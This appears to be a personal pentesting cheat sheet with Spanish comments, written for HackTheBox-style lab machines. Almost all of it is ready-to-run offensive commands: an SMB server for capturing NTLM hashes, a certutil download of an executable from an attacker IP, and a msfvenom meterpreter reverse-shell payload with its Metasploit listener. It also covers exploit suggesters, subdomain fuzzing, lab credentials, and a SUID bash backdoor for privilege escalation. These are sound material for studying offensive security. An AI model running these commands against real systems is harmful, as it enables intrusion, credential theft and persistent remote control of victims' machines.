



## Local port fowarding

esto desde la maquina atacante, es decir, tu mismo, esto se conecta por ssh a la maquina victima y levanta el tunel por ese puerto.

```bash
ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
```

## smb

crear una carpeta compartida rapida por smb y poder capturar hashes NTLM

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```



## mssql

```bash
impacket-mssqlclient  sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb
```





## Subdomain enumeration

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154
```






## File trasnfer

```bash
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```



## PAYLOAD msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f exe -o shell.exe
```


### Listener

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.20
set LPORT 4444
set ExitOnSession false
exploit -j

```


## Modules



```bash
run post/multi/recon/local_exploit_suggester
```





## Windows-exploit-suggester


tenemos que ejecutar primero esto en la maquina *windows* victima

```cmd
sysinfo
```


----------


```bash
python2 /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --update
```

```bash
/opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2020-05-13-mssb.xls --systeminfo sysinfo
```





bash SUID

cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
